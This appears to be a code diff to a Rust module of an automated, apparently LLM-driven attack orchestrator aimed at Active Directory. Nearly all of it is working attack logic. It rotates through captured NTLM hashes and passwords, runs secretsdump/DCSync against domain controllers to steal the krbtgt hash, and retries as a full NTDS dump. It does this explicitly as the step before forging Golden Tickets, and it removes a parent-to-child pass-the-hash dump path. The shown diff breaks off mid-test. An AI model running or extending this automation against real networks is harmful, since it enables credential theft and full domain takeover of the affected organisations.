@@ -11,6 +11,13 @@ use tracing::{info, warn};
 use crate::orchestrator::dispatcher::Dispatcher;
 use crate::orchestrator::state::*;
 
+/// Consecutive `Transient` outcomes on one `(dc, domain, principal)` before
+/// `auto_krbtgt_extraction` gives up on that principal and rotates to the next
+/// candidate. A `Transient` leaves state clean so real network blips retry;
+/// this cap stops a principal whose output never advances (never a
+/// logon-failure, never a parsed krbtgt) from being re-picked every tick.
+const KRBTGT_MAX_TRANSIENT: u32 = 3;
+
 /// Check if a DC domain is a valid secretsdump target for a given credential domain.
 /// Allows same domain, child domain, or parent domain.
 fn is_valid_secretsdump_target(dc_domain: &str, cred_domain: &str) -> bool {
@@ -38,24 +45,12 @@ fn secretsdump_dedup_key(ip: &str, domain: &str, username: &str) -> String {
 
 /// Build PTH secretsdump dedup key.
 fn pth_secretsdump_dedup_key(dc_ip: &str, parent_domain: &str) -> String {
-    format!("{dc_ip}:{parent_domain}:pth_admin")
+    format!("{}:{}:pth_admin", dc_ip, parent_domain)
 }
 
-/// Build parent-to-child PTH dedup key. Distinct from `pth_secretsdump_dedup_key`
-/// so the two directions don't collide when the same (ip, domain) pair appears
-/// in both work lists.
-fn parent_to_child_pth_dedup_key(child_dc_ip: &str, child_domain: &str) -> String {
-    format!(
-        "{}:{}:pth_admin_p2c",
-        child_dc_ip,
-        child_domain.to_lowercase()
-    )
-}
-
-/// Build krbtgt-extraction dedup key. Distinct from the generic PTH key
-/// (which is for full domain dumps) so a prior full-dump failure doesn't
-/// block the narrower `-just-dc-user krbtgt` attempt against the same DC.
-pub(crate) fn krbtgt_extraction_dedup_key(dc_ip: &str, domain: &str) -> String {
+/// Domain-scoped dedup key. Marked only after a candidate has successfully
+/// extracted the krbtgt hash — ends krbtgt work for the domain.
+fn krbtgt_extraction_dedup_key(dc_ip: &str, domain: &str) -> String {
     format!(
         "{}:{}:krbtgt_extraction_direct_v2",
         dc_ip,
@@ -63,18 +58,96 @@ pub(crate) fn krbtgt_extraction_dedup_key(dc_ip: &str, domain: &str) -> String {
     )
 }
 
-/// Find a usable Administrator NTLM hash for a domain.
-fn select_administrator_hash(state: &StateInner, domain: &str) -> Option<String> {
+/// Principal-scoped dedup key. Marked when a candidate credential is rejected
+/// by the DC (STATUS_LOGON_FAILURE and friends) so the loop rotates to the
+/// next DA candidate instead of hot-looping on a broken (dc, principal) pair.
+fn krbtgt_principal_attempt_key(dc_ip: &str, domain: &str, principal: &str) -> String {
+    format!(
+        "{}:{}:krbtgt_extract_principal:{}",
+        dc_ip,
+        domain.to_lowercase(),
+        principal.to_lowercase()
+    )
+}
+
+/// Authentication material for a krbtgt-extraction candidate.
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum KrbtgtAuth {
+    Password(String),
+    Hash(String),
+}
+
+/// A candidate DA identity: `(principal_username, auth)`.
+type KrbtgtCandidate = (String, KrbtgtAuth);
+
+/// Enumerate DA-candidate identities for a domain. Prefers NTLM hashes
+/// (the classic DCSync input) then falls back to admin credentials with
+/// passwords. Skips quarantined principals and delegation accounts. Dedups
+/// by username so a principal with both a hash and a password only appears
+/// once (hash wins).
+fn select_krbtgt_candidates(state: &StateInner, domain: &str) -> Vec<KrbtgtCandidate> {
     let dom = domain.to_lowercase();
-    state
-        .hashes
-        .iter()
-        .find(|h| {
-            h.username.eq_ignore_ascii_case("administrator")
-                && h.hash_type.eq_ignore_ascii_case("NTLM")
-                && h.domain.to_lowercase() == dom
-        })
-        .map(|h| h.hash_value.clone())
+    let mut out = Vec::new();
+    let mut seen = std::collections::HashSet::new();
+
+    for h in state.hashes.iter().filter(|h| {
+        h.domain.to_lowercase() == dom
+            && h.hash_type.eq_ignore_ascii_case("NTLM")
+            && !h.hash_value.is_empty()
+            && !state.is_principal_quarantined(&h.username, &h.domain)
+            && !state.is_delegation_account(&h.username)
+    }) {
+        if seen.insert(h.username.to_lowercase()) {
+            out.push((h.username.clone(), KrbtgtAuth::Hash(h.hash_value.clone())));
+        }
+    }
+
+    for c in state.credentials.iter().filter(|c| {
+        c.domain.to_lowercase() == dom
+            && !c.password.is_empty()
+            && !state.is_principal_quarantined(&c.username, &c.domain)
+            && !state.is_delegation_account(&c.username)
+    }) {
+        if seen.insert(c.username.to_lowercase()) {
+            out.push((c.username.clone(), KrbtgtAuth::Password(c.password.clone())));
+        }
+    }
+
+    out
+}
+
+/// Detect a definitive authentication rejection so the caller marks the
+/// principal as failed and rotates to the next candidate instead of retrying
+/// the same broken pair every 30s.
+fn is_logon_failure(output: &str) -> bool {
+    let s = output.to_ascii_lowercase();
+    s.contains("status_logon_failure")
+        || s.contains("status_no_such_user")
+        || s.contains("status_account_disabled")
+        || s.contains("status_account_locked_out")
+        || s.contains("kdc_err_c_principal_unknown")
+        || s.contains("kdc_err_preauth_failed")
+}
+
+/// Detect impacket's ambiguous-name error. In a multi-domain forest a bare
+/// `-just-dc-user krbtgt` maps to more than one object (every domain has a
+/// krbtgt) and impacket bails with `ERROR_DS_NAME_ERROR_NOT_UNIQUE`. This is a
+/// *retry-with-different-args* signal — re-run as a full dump — NOT a
+/// broken-principal signal, so the caller must not mark the principal failed.
+fn is_name_not_unique(output: &str) -> bool {
+    output
+        .to_ascii_lowercase()
+        .contains("error_ds_name_error_not_unique")
+}
+
+/// Detect a DCSync/DRSUAPI authorization failure: the credential authenticated
+/// fine but lacks the directory-replication rights krbtgt extraction needs —
+/// i.e. it is not a Domain Admin / DCSync-capable principal. Unlike a transient
+/// error, retrying the same principal never helps, so the caller treats this
+/// like an auth rejection and rotates to the next candidate.
+fn is_dcsync_access_denied(output: &str) -> bool {
+    let s = output.to_ascii_lowercase();
+    s.contains("rpc_s_access_denied") || s.contains("error_ds_dra_access_denied")
 }
 
 /// True when we already have a krbtgt hash for the domain (so the GT step is
@@ -101,7 +174,7 @@ pub(crate) fn select_local_admin_secretsdump_work(state: &StateInner) -> Vec<Sec
         .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
         .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
     {
-        for (dc_domain, dc_ip) in &state.all_domains_with_dcs() {
+        for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
             if !is_valid_secretsdump_target(dc_domain, &cred.domain) {
                 continue;
             }
@@ -125,7 +198,7 @@ pub(crate) fn select_pth_secretsdump_work(state: &StateInner) -> Vec<PthSecretsd
     let mut items = Vec::new();
     for dominated in &state.dominated_domains {
         let dom = dominated.to_lowercase();
-        for (dc_domain, dc_ip) in &state.all_domains_with_dcs() {
+        for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
             if !is_child_of(&dom, dc_domain) {
                 continue;
             }
@@ -152,56 +225,6 @@ pub(crate) fn select_pth_secretsdump_work(state: &StateInner) -> Vec<PthSecretsd
     items
 }
 
-/// Select parent-to-child PTH secretsdump work items: dump an undominated
-/// child DC using the dominated forest root's Administrator NTLM hash.
-///
-/// The forest root's RID-500 Administrator is a member of Enterprise Admins
-/// by default, and EA holds admin rights on every child DC in the forest.
-/// So an NTLM PtH against the child DC using the parent admin hash succeeds
-/// cross-domain without forging any Kerberos ticket — DRSUAPI is reachable
-/// once SMB auth lands.
-///
-/// This closes the inverse of `select_pth_secretsdump_work` (which goes
-/// child→parent). Without it, ops where the forest root is rooted first
-/// would leave undominated children sitting forever, since `auto_golden_ticket`
-/// only forges a GT for the rooted domain and never pivots to the child.
-pub(crate) fn select_parent_to_child_secretsdump_work(
-    state: &StateInner,
-) -> Vec<PthSecretsdumpWorkItem> {
-    let mut items = Vec::new();
-    for dominated in &state.dominated_domains {
-        let parent_dom = dominated.to_lowercase();
-        let Some(parent_admin_hash) = state.hashes.iter().find(|h| {
-            h.username.eq_ignore_ascii_case("administrator")
-                && h.hash_type.eq_ignore_ascii_case("NTLM")
-                && h.domain.to_lowercase() == parent_dom
-        }) else {
-            continue;
-        };
-        for (dc_domain, dc_ip) in &state.all_domains_with_dcs() {
-            let dc_dom_lc = dc_domain.to_lowercase();
-            if !is_child_of(&dc_dom_lc, &parent_dom) {
-                continue;
-            }
-            if state.dominated_domains.contains(&dc_dom_lc) {
-                continue;
-            }
-            let dedup = parent_to_child_pth_dedup_key(dc_ip, &dc_dom_lc);
-            if state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
-                continue;
-            }
-            items.push((
-                dedup,
-                dc_ip.clone(),
-                parent_admin_hash.domain.clone(),
-                parent_admin_hash.hash_value.clone(),
-                dc_dom_lc,
-            ));
-        }
-    }
-    items
-}
-
 fn has_krbtgt_hash(state: &StateInner, domain: &str) -> bool {
     let dom = domain.to_lowercase();
     state.hashes.iter().any(|h| {
@@ -211,38 +234,48 @@ fn has_krbtgt_hash(state: &StateInner, domain: &str) -> bool {
     })
 }
 
-fn build_krbtgt_extraction_args(dc_ip: &str, domain: &str, hash_value: &str) -> Value {
-    json!({
-        "target": dc_ip,
-        "target_ip": dc_ip,
-        "dc_ip": dc_ip,
-        "username": "Administrator",
-        "domain": domain,
-        "target_domain": domain,
-        "hash": hash_value,
-        "just_dc_user": "krbtgt",
-        "timeout_minutes": 3,
-    })
+/// Build the `-just-dc-user` value for krbtgt extraction. When the domain's
+/// NetBIOS flat name is known, qualify the account (`CHILD/krbtgt`) so a DC
+/// hosting multiple naming contexts doesn't answer a bare `krbtgt` with
+/// `ERROR_DS_NAME_ERROR_NOT_UNIQUE`. impacket accepts both `NETBIOS/user` and
+/// `NETBIOS\user`; the forward slash avoids shell/JSON escaping.
+fn krbtgt_just_dc_user(netbios: Option<&str>) -> String {
+    match netbios {
+        Some(nb) if !nb.trim().is_empty() => format!("{}/krbtgt", nb.trim().to_uppercase()),
+        _ => "krbtgt".to_string(),
+    }
 }
 
-fn build_krbtgt_extraction_ticket_args(
+/// Build the secretsdump tool args for a krbtgt extraction attempt.
+///
+/// `just_dc_user`:
+/// * `Some("CHILD/krbtgt")` / `Some("krbtgt")` — narrowed DCSync of one account.
+/// * `None` — omit `-just-dc-user` entirely, i.e. a full NTDS dump. Used as the
+///   transparent retry when the narrowed lookup came back ambiguous.
+fn build_krbtgt_extraction_args(
     dc_ip: &str,
     domain: &str,
     username: &str,
-    ticket_path: &str,
+    auth: &KrbtgtAuth,
+    just_dc_user: Option<&str>,
 ) -> Value {
-    json!({
+    let mut args = json!({
         "target": dc_ip,
         "target_ip": dc_ip,
         "dc_ip": dc_ip,
         "username": username,
         "domain": domain,
         "target_domain": domain,
-        "ticket_path": ticket_path,
-        "no_pass": true,
-        "just_dc_user": "krbtgt",
         "timeout_minutes": 3,
-    })
+    });
+    if let Some(jdu) = just_dc_user {
+        args["just_dc_user"] = json!(jdu);
+    }
+    match auth {
+        KrbtgtAuth::Password(p) => args["password"] = json!(p),
+        KrbtgtAuth::Hash(h) => args["hash"] = json!(h),
+    }
+    args
 }
 
 fn discoveries_include_krbtgt(discoveries: Option<&Value>, domain: &str) -> bool {
@@ -269,95 +302,80 @@ fn discoveries_include_krbtgt(discoveries: Option<&Value>, domain: &str) -> bool
         })
 }
 
-async fn dispatch_krbtgt_extraction_direct(
-    dispatcher: &Dispatcher,
-    dc_ip: &str,
-    domain: &str,
-    hash_value: &str,
-) -> bool {
-    let task_id = format!("krbtgt_extract_{}", uuid::Uuid::new_v4().simple());
-    let call = ToolCall {
-        id: format!("{task_id}_call"),
-        name: "secretsdump".to_string(),
-        arguments: build_krbtgt_extraction_args(dc_ip, domain, hash_value),
-    };
+/// Outcome of a krbtgt-extraction attempt (after any internal retry).
+///
+/// * `Success` — krbtgt hash captured; the domain is done.
+/// * `AuthRejected` — a terminal per-principal failure: the DC rejected the
+///   credential (STATUS_LOGON_FAILURE and friends) OR authenticated it but
+///   denied DCSync (not a Domain Admin). Either way retrying the same
+///   principal is pointless, so the caller marks it and rotates.
+/// * `Transient` — anything else (dispatch error, timeout, unparsable
+///   output). The caller leaves state untouched so the next tick can retry.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum KrbtgtOutcome {
+    Success,
+    AuthRejected,
+    Transient,
+}
 
-    info!(
-        task_id = %task_id,
-        dc = %dc_ip,
-        domain = %domain,
-        "krbtgt extraction dispatched (direct tool, just-dc-user krbtgt)"
-    );
+/// Fine-grained classification of a single secretsdump attempt, before the
+/// retry decision in [`dispatch_krbtgt_extraction_direct`] collapses it into a
+/// [`KrbtgtOutcome`]. `NameNotUnique` is separated out because it is the only
+/// class that triggers a same-tick retry (as a full dump) rather than being a
+/// terminal verdict on the principal.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum DumpClass {
+    Success,
+    AuthRejected,
+    NameNotUnique,
+    Transient,
+}
 
-    match dispatcher
-        .llm_runner
-        .tool_dispatcher()
-        .dispatch_tool("credential_access", &task_id, &call)
-        .await
-    {
-        Ok(result) => {
-            let found = discoveries_include_krbtgt(result.discoveries.as_ref(), domain);
-            if found {
-                info!(
-                    task_id = %task_id,
-                    dc = %dc_ip,
-                    domain = %domain,
-                    "krbtgt extraction completed with parsed krbtgt hash"
-                );
-            } else {
-                warn!(
-                    task_id = %task_id,
-                    dc = %dc_ip,
-                    domain = %domain,
-                    error = ?result.error,
-                    output_len = result.output.len(),
-                    "krbtgt extraction completed without parsed krbtgt hash; will retry"
-                );
-            }
-            found
-        }
-        Err(e) => {
-            warn!(
-                err = %e,
-                dc = %dc_ip,
-                domain = %domain,
-                "Failed to dispatch direct krbtgt extraction"
-            );
-            false
-        }
+/// Classify a completed secretsdump result. Order matters: a parsed krbtgt hash
+/// wins over everything; an ambiguous-name error is a retry signal (checked
+/// before the rejection detectors so it can't be mistaken for a broken
+/// principal); logon-failure and DCSync-denied are both terminal per-principal
+/// rejections; anything else is transient.
+fn classify_krbtgt_result(discoveries: Option<&Value>, output: &str, domain: &str) -> DumpClass {
+    if discoveries_include_krbtgt(discoveries, domain) {
+        DumpClass::Success
+    } else if is_name_not_unique(output) {
+        DumpClass::NameNotUnique
+    } else if is_logon_failure(output) || is_dcsync_access_denied(output) {
+        DumpClass::AuthRejected
+    } else {
+        DumpClass::Transient
     }
 }
 
-/// Dispatches `secretsdump -k -no-pass -just-dc-user krbtgt` against a DC
-/// using a Kerberos `.ccache` ticket — the kill-shot after a successful
-/// constrained-delegation S4U lands a CIFS ticket as Administrator on a DC.
-///
-/// Called inline by `auto_chain_s4u_secretsdump` (result_processing) so the
-/// chain runs directly instead of enqueueing an LLM `credential_access` task
-/// that may drop `-just-dc-user`, mis-shape the ticket env, or omit
-/// `-no-pass`. Returns `true` when discoveries report a krbtgt hash for
-/// `domain`.
-pub(crate) async fn dispatch_krbtgt_extraction_with_ticket(
+/// Dispatch a single secretsdump attempt and classify its result.
+async fn run_krbtgt_dump(
     dispatcher: &Dispatcher,
     dc_ip: &str,
     domain: &str,
     username: &str,
-    ticket_path: &str,
-) -> bool {
-    let task_id = format!("krbtgt_extract_s4u_{}", uuid::Uuid::new_v4().simple());
+    auth: &KrbtgtAuth,
+    just_dc_user: Option<&str>,
+) -> DumpClass {
+    let task_id = format!("krbtgt_extract_{}", uuid::Uuid::new_v4().simple());
+    let auth_kind = match auth {
+        KrbtgtAuth::Password(_) => "password",
+        KrbtgtAuth::Hash(_) => "hash",
+    };
     let call = ToolCall {
-        id: format!("{task_id}_call"),
+        id: format!("{}_call", task_id),
         name: "secretsdump".to_string(),
-        arguments: build_krbtgt_extraction_ticket_args(dc_ip, domain, username, ticket_path),
+        arguments: build_krbtgt_extraction_args(dc_ip, domain, username, auth, just_dc_user),
     };
 
     info!(
         task_id = %task_id,
         dc = %dc_ip,
         domain = %domain,
-        username = %username,
-        ticket = %ticket_path,
-        "krbtgt extraction dispatched (direct tool, S4U ticket, just-dc-user krbtgt)"
+        principal = %username,
+        auth_kind = %auth_kind,
+        just_dc_user = %just_dc_user.unwrap_or("<full-dump>"),
+        "krbtgt extraction dispatched (direct tool)"
     );
 
     match dispatcher
@@ -367,35 +385,79 @@ pub(crate) async fn dispatch_krbtgt_extraction_with_ticket(
         .await
     {
         Ok(result) => {
-            let found = discoveries_include_krbtgt(result.discoveries.as_ref(), domain);
-            if found {
-                info!(
-                    task_id = %task_id,
-                    dc = %dc_ip,
-                    domain = %domain,
-                    "krbtgt extraction via S4U ticket completed with parsed krbtgt hash"
-                );
-            } else {
-                warn!(
-                    task_id = %task_id,
-                    dc = %dc_ip,
-                    domain = %domain,
-                    error = ?result.error,
-                    output_len = result.output.len(),
-                    "krbtgt extraction via S4U ticket completed without parsed krbtgt hash"
-                );
+            let class = classify_krbtgt_result(result.discoveries.as_ref(), &result.output, domain);
+            match class {
+                DumpClass::Success => info!(
+                    task_id = %task_id, dc = %dc_ip, domain = %domain, principal = %username,
+                    "krbtgt extraction completed with parsed krbtgt hash"
+                ),
+                DumpClass::NameNotUnique => warn!(
+                    task_id = %task_id, dc = %dc_ip, domain = %domain, principal = %username,
+                    "krbtgt lookup ambiguous (ERROR_DS_NAME_ERROR_NOT_UNIQUE) — will retry as full dump"
+                ),
+                DumpClass::AuthRejected => warn!(
+                    task_id = %task_id, dc = %dc_ip, domain = %domain, principal = %username,
+                    auth_kind = %auth_kind,
+                    "krbtgt extraction rejected (bad creds or no DCSync rights) — dropping principal for this run"
+                ),
+                DumpClass::Transient => warn!(
+                    task_id = %task_id, dc = %dc_ip, domain = %domain, principal = %username,
+                    error = ?result.error, output_len = result.output.len(),
+                    "krbtgt extraction completed without parsed krbtgt hash; will retry"
+                ),
             }
-            found
+            class
         }
         Err(e) => {
             warn!(
                 err = %e,
                 dc = %dc_ip,
                 domain = %domain,
-                "Failed to dispatch S4U-ticket krbtgt extraction"
+                principal = %username,
+                "Failed to dispatch direct krbtgt extraction"
             );
-            false
+            DumpClass::Transient
         }
+    }
+}
+
+/// Extract krbtgt for one `(dc, domain, principal)` pair, qualifying
+/// `-just-dc-user` with the domain's NetBIOS flat name when known and
+/// transparently retrying as a full NTDS dump if the narrowed lookup comes back
+/// ambiguous (`ERROR_DS_NAME_ERROR_NOT_UNIQUE`).
+async fn dispatch_krbtgt_extraction_direct(
+    dispatcher: &Dispatcher,
+    dc_ip: &str,
+    domain: &str,
+    username: &str,
+    auth: &KrbtgtAuth,
+    netbios: Option<&str>,
+) -> KrbtgtOutcome {
+    // Attempt 1: narrowed `-just-dc-user`, NetBIOS-qualified when known.
+    let jdu = krbtgt_just_dc_user(netbios);
+    let class = run_krbtgt_dump(dispatcher, dc_ip, domain, username, auth, Some(&jdu)).await;
+
+    // On ambiguity, retry once without `-just-dc-user`. impacket then dumps the
+    // whole NTDS (no name to disambiguate), and the output parser attributes
+    // the krbtgt row via the dump's own $MACHINE.ACC / domain-prefixed markers.
+    let class = if class == DumpClass::NameNotUnique {
+        warn!(
+            dc = %dc_ip,
+            domain = %domain,
+            principal = %username,
+            "retrying krbtgt extraction as full NTDS dump"
+        );
+        run_krbtgt_dump(dispatcher, dc_ip, domain, username, auth, None).await
+    } else {
+        class
+    };
+
+    match class {
+        DumpClass::Success => KrbtgtOutcome::Success,
+        DumpClass::AuthRejected => KrbtgtOutcome::AuthRejected,
+        // A NameNotUnique that survived the full-dump retry (shouldn't happen)
+        // or any other non-terminal result is transient — retry next tick.
+        DumpClass::NameNotUnique | DumpClass::Transient => KrbtgtOutcome::Transient,
     }
 }
 
@@ -501,64 +563,32 @@ pub async fn auto_local_admin_secretsdump(
                 Err(e) => warn!(err = %e, "Failed to dispatch PTH secretsdump"),
             }
         }
-
-        // Parent-to-child PTH: when we dominate a forest root, dump
-        // undominated child DCs with the parent's Administrator NTLM hash.
-        // RID-500 admin in the forest root is EA, so PtH against the child
-        // DC reaches DRSUAPI directly — no Kerberos forging needed.
-        let p2c_work: Vec<PthSecretsdumpWorkItem> = {
-            let state = dispatcher.state.read().await;
-            select_parent_to_child_secretsdump_work(&state)
-        };
-
-        for (dedup_key, dc_ip, hash_domain, hash_value, child_domain) in
-            p2c_work.into_iter().take(2)
-        {
-            let priority = dispatcher.effective_priority("dc_secretsdump");
-            match dispatcher
-                .request_secretsdump_hash(
-                    &dc_ip,
-                    "Administrator",
-                    &hash_domain,
-                    &hash_value,
-                    priority,
-                    None,
-                )
-                .await
-            {
-                Ok(Some(task_id)) => {
-                    info!(
-                        task_id = %task_id,
-                        child_dc = %dc_ip,
-                        child_domain = %child_domain,
-                        parent_domain = %hash_domain,
-                        "Parent-to-child PTH secretsdump dispatched against child DC"
-                    );
-                    {
-                        let mut state = dispatcher.state.write().await;
-                        state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
-                        state.mark_credential_capture_in_flight(&child_domain);
-                    }
-                    let _ = dispatcher
-                        .state
-                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
-                        .await;
-                }
-                Ok(None) => {}
-                Err(e) => warn!(err = %e, "Failed to dispatch parent-to-child PTH secretsdump"),
-            }
-        }
     }
 }
 
-/// Dispatches a narrowed `secretsdump -just-dc-user krbtgt` whenever we hold
-/// an Administrator NTLM hash for a domain but haven't yet captured that
-/// domain's krbtgt hash. This closes the gap between "DA captured" and
-/// "Golden Ticket forged": `auto_local_admin_secretsdump` only fires the PtH
-/// path on child→parent escalation (gated on `dominated_domains`), and the
-/// generic credential_access prompt lets the LLM omit `-just-dc-user` or
-/// mis-shape the hash argument. Dispatch the tool directly and only mark the
-/// dedup after parser output confirms the krbtgt hash. Once krbtgt lands,
+/// Dispatches a narrowed `secretsdump -just-dc-user krbtgt` for any domain
+/// whose krbtgt hash we haven't captured yet, rotating through candidate DA
+/// identities (Administrator NTLM hash, then any admin credential with a
+/// password) one per tick.
+///
+/// Closes the gap between "DA captured" and "Golden Ticket forged": the
+/// existing `auto_local_admin_secretsdump` only fires the PtH path on
+/// child→parent escalation (gated on `dominated_domains`), and the generic
+/// credential_access prompt lets the LLM omit `-just-dc-user` or mis-shape
+/// arg names. Dispatching the tool directly with structured args avoids
+/// both.
+///
+/// `-just-dc-user` is qualified with the domain's NetBIOS flat name
+/// (`CHILD/krbtgt`) when known, so a multi-domain DC doesn't answer a bare
+/// `krbtgt` with `ERROR_DS_NAME_ERROR_NOT_UNIQUE`; if the narrowed lookup is
+/// still ambiguous, the dispatch path retries once as a full NTDS dump.
+///
+/// On `STATUS_LOGON_FAILURE` (and other definitive auth rejections, including
+/// `rpc_s_access_denied` from a non-DCSync principal) the principal is marked
+/// failed for this DC so the loop advances to the next candidate instead of
+/// hot-looping a broken pair. Persistent non-advancing `Transient` output is
+/// also rotated after `KRBTGT_MAX_TRANSIENT` ticks. On success, the
+/// domain-scoped dedup ends krbtgt work for that domain and
 /// `auto_golden_ticket` takes over.
 pub async fn auto_krbtgt_extraction(
     dispatcher: Arc<Dispatcher>,
@@ -580,42 +610,130 @@ pub async fn auto_krbtgt_extraction(
             continue;
         }
 
-        let work: Vec<(String, String, String, String)> = {
+        // Per tick, pick the first (dc, domain, principal) triple with both
+        // an untried domain and an untried candidate. Rotating one principal
+        // per tick keeps blast radius low while still advancing.
+        type KrbtgtSelection = (
+            String,
+            String,
+            String,
+            String,
+            String,
+            Option<String>,
+            KrbtgtAuth,
+        );
+        let selection: Option<KrbtgtSelection> = {
             let state = dispatcher.state.read().await;
-            let mut items = Vec::new();
-            for (dc_domain, dc_ip) in &state.all_domains_with_dcs() {
+            let mut chosen = None;
+            'outer: for (dc_domain, dc_ip) in state.all_domains_with_dcs().iter() {
                 let dom = dc_domain.to_lowercase();
                 if has_krbtgt_hash(&state, &dom) {
                     continue;
                 }
-                let Some(hash) = select_administrator_hash(&state, &dom) else {
-                    continue;
-                };
-                let dedup = krbtgt_extraction_dedup_key(dc_ip, &dom);
-                if state.is_processed(DEDUP_SECRETSDUMP, &dedup) {
+                let domain_dedup = krbtgt_extraction_dedup_key(dc_ip, &dom);
+                if state.is_processed(DEDUP_SECRETSDUMP, &domain_dedup) {
                     continue;
                 }
-                items.push((dedup, dc_ip.clone(), dom, hash));
+                for (principal, auth) in select_krbtgt_candidates(&state, &dom) {
+                    let principal_dedup = krbtgt_principal_attempt_key(dc_ip, &dom, &principal);
+                    if state.is_processed(DEDUP_SECRETSDUMP, &principal_dedup) {
+                        continue;
+                    }
+                    chosen = Some((
+                        domain_dedup,
+                        principal_dedup,
+                        dc_ip.clone(),
+                        dom.clone(),
+                        principal,
+                        // NetBIOS flat name to disambiguate `-just-dc-user` in a
+                        // multi-domain forest; `None` falls back to bare krbtgt
+                        // plus the full-dump retry inside the dispatch path.
+                        resolve_fqdn_to_flat(&dom, &state),
+                        auth,
+                    ));
+                    break 'outer;
+                }
             }
-            items
+            chosen
         };
 
-        for (dedup_key, dc_ip, domain, hash_value) in work.into_iter().take(2) {
-            {
-                let mut state = dispatcher.state.write().await;
-                state.mark_credential_capture_in_flight(&domain);
-            }
+        let Some((domain_dedup, principal_dedup, dc_ip, domain, principal, netbios, auth)) =
+            selection
+        else {
+            continue;
+        };
 
-            if dispatch_krbtgt_extraction_direct(&dispatcher, &dc_ip, &domain, &hash_value).await {
+        {
+            let mut state = dispatcher.state.write().await;
+            state.mark_credential_capture_in_flight(&domain);
+        }
+
+        match dispatch_krbtgt_extraction_direct(
+            &dispatcher,
+            &dc_ip,
+            &domain,
+            &principal,
+            &auth,
+            netbios.as_deref(),
+        )
+        .await
+        {
+            KrbtgtOutcome::Success => {
                 {
                     let mut state = dispatcher.state.write().await;
-                    state.mark_processed(DEDUP_SECRETSDUMP, dedup_key.clone());
+                    state.mark_processed(DEDUP_SECRETSDUMP, domain_dedup.clone());
                     state.mark_credential_capture_in_flight(&domain);
+                    state.krbtgt_transient_counts.remove(&principal_dedup);
                 }
                 let _ = dispatcher
                     .state
-                    .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup_key)
+                    .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &domain_dedup)
                     .await;
+            }
+            KrbtgtOutcome::AuthRejected => {
+                {
+                    let mut state = dispatcher.state.write().await;
+                    state.mark_processed(DEDUP_SECRETSDUMP, principal_dedup.clone());
+                    state.krbtgt_transient_counts.remove(&principal_dedup);
+                }
+                let _ = dispatcher
+                    .state
+                    .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &principal_dedup)
+                    .await;
+            }
+            KrbtgtOutcome::Transient => {
+                // Leave the domain/principal dedup clean so genuine blips
+                // retry — but bound the churn. After KRBTGT_MAX_TRANSIENT
+                // consecutive non-advancing Transients on this principal,
+                // rotate as if it were rejected.
+                let promote = {
+                    let mut state = dispatcher.state.write().await;
+                    let count = state
+                        .krbtgt_transient_counts
+                        .entry(principal_dedup.clone())
+                        .or_insert(0);
+                    *count += 1;
+                    if *count >= KRBTGT_MAX_TRANSIENT {
+                        state.mark_processed(DEDUP_SECRETSDUMP, principal_dedup.clone());
+                        state.krbtgt_transient_counts.remove(&principal_dedup);
+                        true
+                    } else {
+                        false
+                    }
+                };
+                if promote {
+                    warn!(
+                        dc = %dc_ip,
+                        domain = %domain,
+                        principal = %principal,
+                        threshold = KRBTGT_MAX_TRANSIENT,
+                        "krbtgt principal stuck in Transient — rotating to next candidate"
+                    );
+                    let _ = dispatcher
+                        .state
+                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &principal_dedup)
+                        .await;
+                }
             }
         }
     }
@@ -760,11 +878,16 @@ mod tests {
     }
 
     #[test]
-    fn build_krbtgt_extraction_args_uses_direct_secretsdump_shape() {
+    fn build_krbtgt_extraction_args_with_hash() {
+        let auth = KrbtgtAuth::Hash(
+            "aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef".into(),
+        );
         let args = build_krbtgt_extraction_args(
             "192.168.58.20",
             "contoso.local",
-            "aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef",
+            "Administrator",
+            &auth,
+            Some("krbtgt"),
         );
         assert_eq!(args["target"], "192.168.58.20");
         assert_eq!(args["target_ip"], "192.168.58.20");
@@ -776,31 +899,224 @@ mod tests {
             args["hash"],
             "aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef"
         );
+        assert!(args.get("password").is_none());
         assert_eq!(args["just_dc_user"], "krbtgt");
         assert_eq!(args["timeout_minutes"], 3);
     }
 
     #[test]
-    fn build_krbtgt_extraction_ticket_args_carries_ticket_and_no_pass() {
-        let args = build_krbtgt_extraction_ticket_args(
+    fn build_krbtgt_extraction_args_with_password() {
+        let auth = KrbtgtAuth::Password("_L0ngCl@w_".into());
+        let args = build_krbtgt_extraction_args(
             "192.168.58.20",
             "contoso.local",
-            "Administrator",
-            "/tmp/Administrator@CIFS_dc01@CONTOSO.LOCAL.ccache",
+            "alice",
+            &auth,
+            Some("krbtgt"),
         );
-        assert_eq!(args["target"], "192.168.58.20");
-        assert_eq!(args["target_ip"], "192.168.58.20");
-        assert_eq!(args["dc_ip"], "192.168.58.20");
-        assert_eq!(args["username"], "Administrator");
-        assert_eq!(args["domain"], "contoso.local");
-        assert_eq!(args["target_domain"], "contoso.local");
-        assert_eq!(
-            args["ticket_path"],
-            "/tmp/Administrator@CIFS_dc01@CONTOSO.LOCAL.ccache"
-        );
-        assert_eq!(args["no_pass"], true);
+        assert_eq!(args["username"], "alice");
+        assert_eq!(args["password"], "_L0ngCl@w_");
+        assert!(args.get("hash").is_none());
         assert_eq!(args["just_dc_user"], "krbtgt");
-        assert!(args.get("hash").is_none(), "must not carry an NTLM hash");
+    }
+
+    #[test]
+    fn build_krbtgt_extraction_args_qualified_netbios() {
+        let auth = KrbtgtAuth::Password("Pw".into());
+        let args = build_krbtgt_extraction_args(
+            "192.168.58.20",
+            "child.contoso.local",
+            "alice",
+            &auth,
+            Some("CHILD/krbtgt"),
+        );
+        assert_eq!(args["just_dc_user"], "CHILD/krbtgt");
+    }
+
+    #[test]
